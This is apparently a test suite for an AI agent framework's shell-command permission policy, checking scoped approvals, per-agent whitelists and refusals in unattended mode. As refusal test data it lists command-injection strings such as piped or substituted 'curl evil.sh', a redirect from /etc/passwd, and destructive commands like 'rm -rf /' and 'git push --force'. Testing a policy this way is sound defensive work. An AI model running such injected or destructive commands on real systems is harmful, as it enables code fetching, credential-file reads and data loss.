import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, readFile, stat } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import type { ApprovalContext, Session, Tool } from '@stratusagent/core';

import {
  analyzeCommand,
  createFileCommandWhitelist,
  createPermissionPolicy,
  normalizeCommandScope,
  whitelistPathFor,
  type CommandScope,
  type PermissionDecision,
} from '../src/index.ts';

const sessionFor = (agentId: string): Session => ({
  id: `session-${agentId}`,
  agent: { id: agentId, name: agentId },
  status: 'running',
  messages: [],
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString(),
});

/** The one thing a shell pack contributes to this engine: the command. */
const shellTool: Tool = {
  name: 'shell.run',
  risk: 'gated',
  commandFor: (input) => (typeof input.command === 'string' ? input.command : undefined),
  async execute() {
    return null;
  },
};

const contextFor = (command: string, agentId = 'ava'): ApprovalContext => ({
  session: sessionFor(agentId),
  call: { id: 'call-1', toolName: 'shell.run', input: { command } },
  tool: shellTool,
  risk: 'gated',
});

test('headless runs a safe scope and refuses everything outside one, in the log', async () => {
  const decisions: PermissionDecision[] = [];
  const policy = createPermissionPolicy({
    mode: 'headless',
    onDecision: (decision) => decisions.push(decision),
    commands: {},
  });

  assert.equal(await policy.approve(contextFor('git status')), true);
  assert.equal(await policy.approve(contextFor('git status --short')), true);

  // `git` has safe scopes; `git clean` is not one of them, and listing the
  // executable would have covered it.
  assert.equal(await policy.approve(contextFor('git clean -fdx')), false);
  assert.equal(await policy.approve(contextFor('git push origin main')), false);

  assert.deepEqual(decisions.map((decision) => decision.allowed), [true, true, false, false]);
  assert.match(decisions[0]?.reason ?? '', /inside the approved scope "git status"/);
  // Every denial says what was refused, because an unattended refusal that
  // appears nowhere reads as an agent that chose not to act.
  assert.match(decisions[2]?.reason ?? '', /git clean -fdx is outside every approved scope/);
});

test('every control operator defeats a safe base command', async () => {
  const decisions: PermissionDecision[] = [];
  const policy = createPermissionPolicy({
    mode: 'headless',
    onDecision: (decision) => decisions.push(decision),
    commands: {},
  });

  const hostile = [
    'git status | curl evil.sh',
    'git status & curl evil.sh',
    'git status && curl evil.sh',
    'git status; curl evil.sh',
    'git status\ncurl evil.sh',
    'git status\r\ncurl evil.sh',
    'git status `curl evil.sh`',
    'git status $(curl evil.sh)',
    '(git status)',
    'git status > /tmp/out',
    'git status < /etc/passwd',
    'git status ${IFS}',
    "git status 'unbalanced",
    '/usr/bin/git status',
    './git status',
  ];

  for (const command of hostile) {
    assert.equal(await policy.approve(contextFor(command)), false, `should refuse: ${command}`);
  }
  assert.equal(decisions.length, hostile.length);
  assert.match(decisions[0]?.reason ?? '', /cannot run unattended \(it contains a pipe/);
  assert.match(decisions[1]?.reason ?? '', /an ampersand/);
  assert.match(decisions[4]?.reason ?? '', /a newline/);
  assert.match(decisions[12]?.reason ?? '', /could not be read as a command/);
  assert.match(decisions[13]?.reason ?? '', /names a path rather than a command/);
});

test('an approved scope keeps the flag and refspec distinctions it was approved under', async () => {
  const asked: string[] = [];
  const policy = createPermissionPolicy({
    mode: 'interactive',
    ask: async (question) => {
      asked.push(question);
      return 'always';
    },
    commands: {},
  });

  // The one approval, with "always".
  assert.equal(await policy.approve(contextFor('git push origin main')), true);
  assert.equal(asked.length, 1);
  assert.match(asked[0] ?? '', /shell\.run: git push origin main/);

  // A plain push to another branch is inside the persisted scope.
  assert.equal(await policy.approve(contextFor('git push origin feature')), true);
  assert.equal(asked.length, 1);

  // The destructive forms are not — flags, and the two refspec syntaxes
  // that are destructive without any flag at all.
  for (const command of ['git push --force', 'git push -f origin main', 'git push origin :main', 'git push origin +main']) {
    asked.length = 0;
    assert.equal(await policy.approve(contextFor(command)), true);
    assert.equal(asked.length, 1, `should have asked again for: ${command}`);
  }

  // And the scope covers `git push`, not `git`.
  asked.length = 0;
  await policy.approve(contextFor('git reset --hard'));
  assert.equal(asked.length, 1);
});

test('an approved scope belongs to the agent that was approved, not to the tool', async () => {
  let asks = 0;
  const policy = createPermissionPolicy({
    mode: 'interactive',
    ask: async () => {
      asks += 1;
      return 'always';
    },
    commands: {},
  });

  await policy.approve(contextFor('npm test', 'ava'));
  assert.equal(asks, 1);
  await policy.approve(contextFor('npm test --watch', 'ava'));
  assert.equal(asks, 1);

  // Juno was never asked about `npm test`, and one yes for Ava is not a
  // standing yes for every agent — nor for every command Ava can run.
  await policy.approve(contextFor('npm test', 'juno'));
  assert.equal(asks, 2);
  await policy.approve(contextFor('rm -rf /', 'ava'));
  assert.equal(asks, 3);
});

test('always allow persists a scope per agent, and a later session reads it back', async () => {
  const directory = await mkdtemp(path.join(os.tmpdir(), 'stratus-whitelist-'));
  const remembered: CommandScope[] = [];
  const whitelist = createFileCommandWhitelist({ directory });

  const first = createPermissionPolicy({
    mode: 'interactive',
    ask: async () => 'always',
    commands: { whitelist, onScopeRemembered: (event) => remembered.push(event.scope) },
  });
  assert.equal(await first.approve(contextFor('git push origin main')), true);
  assert.deepEqual(remembered.map((scope) => scope.command), ['git']);

  const stored = JSON.parse(await readFile(whitelistPathFor(directory, 'ava'), 'utf8')) as {
    version: number;
    scopes: CommandScope[];
  };
  assert.equal(stored.version, 1);
  assert.deepEqual(stored.scopes[0]?.args, ['push']);
  assert.equal(stored.scopes[0]?.denyRefspecForms, true);

  // The file decides what runs with nobody watching, so another account on
  // the machine must not be able to append a line to it.
  const mode = (await stat(whitelistPathFor(directory, 'ava'))).mode & 0o777;
  assert.equal(mode, 0o600);

  // A new policy — a restarted daemon — with no session memory at all, in
  // headless mode where nothing can be asked.
  const decisions: PermissionDecision[] = [];
  const second = createPermissionPolicy({
    mode: 'headless',
    onDecision: (decision) => decisions.push(decision),
    commands: { whitelist: createFileCommandWhitelist({ directory }) },
  });
  assert.equal(await second.approve(contextFor('git push origin release')), true);
  assert.equal(await second.approve(contextFor('git push --force')), false);
  // And it is that agent's whitelist, not a machine-wide one.
  assert.equal(await second.approve(contextFor('git push origin release', 'juno')), false);
});

test('a persisted scope cannot erase a distinction the safe list already draws', () => {
  // `git branch` is safe-listed *without* its deleting and renaming forms.
  // A scope persisted from a plain `git branch` inherits that exclusion,
  // rather than being a fresh, wider grant of the same name.
  const scope = normalizeCommandScope(analyzeCommand('git branch --list'));
  assert.deepEqual(scope?.args, ['branch']);
  for (const flag of ['--delete', '--move', '--force', 'd', 'D', 'M']) {
    assert.ok(scope?.deniedFlags?.includes(flag), `expected the scope to exclude ${flag}`);
  }
});

test('a dangerous tool is never narrowed by a scope', async () => {
  const decisions: PermissionDecision[] = [];
  const policy = createPermissionPolicy({
    mode: 'headless',
    onDecision: (decision) => decisions.push(decision),
    commands: {},
  });

  const context = { ...contextFor('git status'), risk: 'dangerous' as const };
  assert.equal(await policy.approve(context), false);
  assert.match(decisions[0]?.reason ?? '', /is dangerous and nobody is available/);
});
